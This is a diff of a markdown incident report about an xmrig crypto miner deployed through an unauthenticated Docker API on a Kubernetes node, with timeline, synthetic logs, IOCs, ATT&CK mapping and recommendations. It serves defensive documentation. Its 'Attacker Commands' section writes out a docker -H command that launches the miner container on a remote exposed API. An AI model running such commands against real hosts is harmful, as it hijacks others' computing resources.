@@ -1,13 +1,17 @@
-# 🛡 Crypto Miner on Linux Container Host
+🛡 Crypto Miner on Linux Container Host (Anonymized)
+📌 Executive Summary
 
-## 📌 Executive Summary
-During log review, unusual CPU spikes were observed on a Kubernetes worker node. Investigation revealed a crypto miner binary (`xmrig`) deployed via a misconfigured container. The attacker exploited exposed Docker API to deploy the container.
+During log review, unusual CPU spikes were observed on a Kubernetes worker node.
+Investigation revealed a crypto miner binary (xmrig) deployed via a misconfigured container.
+The attacker exploited an exposed Docker API to deploy the container.
 
-**🎯 Outcome:** resource hijacking detected, miner removed, exposure closed.
+🎯 Outcome: resource hijacking detected, miner removed, exposure closed.
+
+____________________________________________________________________________________________
 
 ---
 
-## 🖼 Attack Flow (ASCII Diagram)
+🖼 Attack Flow (ASCII Diagram)
 
 +---------------------------+
 | Exposed Docker API Port   |
@@ -38,37 +42,148 @@ During log review, unusual CPU spikes were observed on a Kubernetes worker node.
 
 ---
 
-## ⏱ Timeline (UTC)
-- 02:41 – Metrics show CPU usage 95% on worker node.  
-- 02:44 – Netflow reveals mining pool connections.  
-- 02:50 – Analyst confirms xmrig binary inside container.  
-- 03:05 – Container killed; port closed.  
-- 03:30 – Post-mortem + K8s audit logs reviewed.  
+____________________________________________________________________________________________
 
----
+📖 Attack Narrative
+🥷 Stage 1 – Initial Access
 
-## 🔑 Key Findings
-- Docker API exposed to internet without auth.  
-- Miner pulled from public registry.  
-- Traffic to Monero pool detected.  
+Attacker scanned for exposed Docker API (port 2375).
 
----
+Found unauthenticated API endpoint on worker node.
 
-## 🗂️ MITRE ATT&CK Mapping
-- **T1190 – Exploit Public-Facing Application**  
-- **T1496 – Resource Hijacking**  
-- **T1105 – Ingress Tool Transfer**  
+🛠 Stage 2 – Execution
 
----
+Deployed a container running xmrig from public Docker Hub image.
 
-## 👀 Detection Use Cases
-- Monitor abnormal CPU / GPU spikes.  
-- Alert on containers pulling suspicious images.  
-- Detect outbound to known mining pools.  
+Miner executed immediately, consuming high CPU.
 
----
+📡 Stage 3 – Persistence & Impact
 
-## 🛡️ Recommendations
-- Restrict Docker API access.  
-- Enable authentication for container deployments.  
-- Build detections for mining indicators in SIEM.  
+Outbound traffic to Monero mining pool detected.
+
+Host performance degraded → SOC triggered anomaly alert.
+
+🛡 Stage 4 – Response
+
+IR team confirmed miner in container logs.
+
+Container removed, exposed port firewalled.
+
+Post-mortem conducted with Kubernetes audit logs.
+
+____________________________________________________________________________________________
+
+⏱️ Timeline (UTC)
+Time	Event
+02:41	📊 Metrics show CPU usage 95% on worker node
+02:44	🌐 Netflow reveals outbound to mining pool (port 3333)
+02:50	🔎 Analyst confirms xmrig binary inside container
+03:05	🛑 Malicious container killed; Docker API closed
+03:30	📑 Post-mortem; Kubernetes audit logs reviewed
+
+____________________________________________________________________________________________
+
+🔑 Key Findings
+
+🔓 Docker API exposed to internet without authentication.
+
+🐳 Miner image (xmrig/xmrig:latest) pulled from public registry.
+
+📡 Traffic to Monero mining pool pool.minexmr.example:3333.
+
+____________________________________________________________________________________________
+
+🗂️ MITRE ATT&CK Mapping
+
+T1190 – Exploit Public-Facing Application (Docker API)
+
+T1496 – Resource Hijacking (Crypto Mining)
+
+T1105 – Ingress Tool Transfer (Pulling xmrig image)
+
+____________________________________________________________________________________________
+
+📂 Artifacts (Synthetic / Anonymized)
+
+{
+  "time": "2025-07-12T02:41:22Z",
+  "metric": "cpu_usage",
+  "value": "95%",
+  "container_id": "3f2c9d8c5ab2",
+  "image": "xmrig/xmrig:latest"
+}
+
+{
+  "time": "2025-07-12T02:44:10Z",
+  "eventSource": "netflow",
+  "srcIP": "10.10.45.12",
+  "dstIP": "185.203.116.45",
+  "dstPort": 3333,
+  "protocol": "TCP",
+  "action": "ALLOW"
+}
+
+{
+  "time": "2025-07-12T02:50:01Z",
+  "eventSource": "docker.logs",
+  "container": "xmrig",
+  "message": "[+] Mining at pool.minexmr.example:3333 using 4 threads"
+}
+
+____________________________________________________________________________________________
+
+💻 Attacker Commands (Reconstructed, Synthetic)
+
+# 🚀 Deploy malicious container
+docker -H tcp://0.0.0.0:2375 run -d --name miner xmrig/xmrig:latest
+
+# ⛏️ Miner process observed inside container
+ps aux | grep xmrig
+
+# 📡 Mining traffic to external pool
+netstat -anp | grep 3333
+
+____________________________________________________________________________________________
+
+🧾 IOCs (Synthetic)
+
+| Type      | Value                      | Source           | Status     |
+| --------- | -------------------------- | ---------------- | ---------- |
+| 🌐 IP     | 185.203.116.45             | Netflow          | Malicious  |
+| 🔗 Domain | pool.minexmr.example       | Container logs   | Malicious  |
+| 🐳 Image  | xmrig/xmrig\:latest        | Docker pull logs | Malicious  |
+| ⚙️ Port   | 2375 (Docker API, exposed) | Infra config     | Vulnerable |
+
+____________________________________________________________________________________________
+
+👀 Detection Use Cases
+
+🚨 Alert on containers pulling images from untrusted registries.
+
+🚨 Monitor abnormal CPU/GPU spikes per container.
+
+🌐 Detect outbound traffic to known crypto mining pools.
+
+____________________________________________________________________________________________
+
+🛡️ Response Actions
+
+❌ Terminated malicious container.
+
+🔒 Firewalled Docker API port 2375.
+
+🗑 Removed cached miner image.
+
+📑 Reviewed Kubernetes audit logs for persistence.
+
+____________________________________________________________________________________________
+
+🛡️ Recommendations
+
+🔐 Restrict Docker API access (bind to localhost / use TLS).
+
+🧑‍💻 Require authentication for container deployments.
+
+🛡 Build SIEM detections for miner indicators.
+
+🔄 Regular patching and review of Kubernetes worker node exposure.
